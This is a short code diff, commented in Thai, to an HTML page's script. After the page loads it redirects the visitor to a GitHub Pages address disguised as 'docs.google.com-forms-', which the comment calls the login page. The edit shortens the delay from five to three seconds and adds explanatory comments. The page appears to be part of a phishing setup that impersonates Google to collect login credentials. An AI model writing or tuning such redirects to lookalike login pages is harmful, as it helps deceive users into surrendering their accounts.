@@ -44,11 +44,12 @@
     </div>
 
     <script>
-        // รอ 3 วินาทีหลังจากโหลดหน้าเว็บ
+        // ใช้ window.onload เพื่อให้แน่ใจว่า setTimeout ทำงานหลังจากหน้าเว็บโหลดเสร็จ
         window.onload = function() {
+            // ตั้งเวลา 3 วินาทีในการเปลี่ยนหน้าไปยังหน้าล็อกอิน
             setTimeout(function() {
                 window.location.href = "https://dark123351.github.io/docs.google.com-forms-/"; // ลิงก์ไปยังหน้าล็อกอิน
-            }, 5000); // 5000 ms = 5 วินาที
+            }, 3000); // 3000 ms = 3 วินาที
         };
     </script>
 
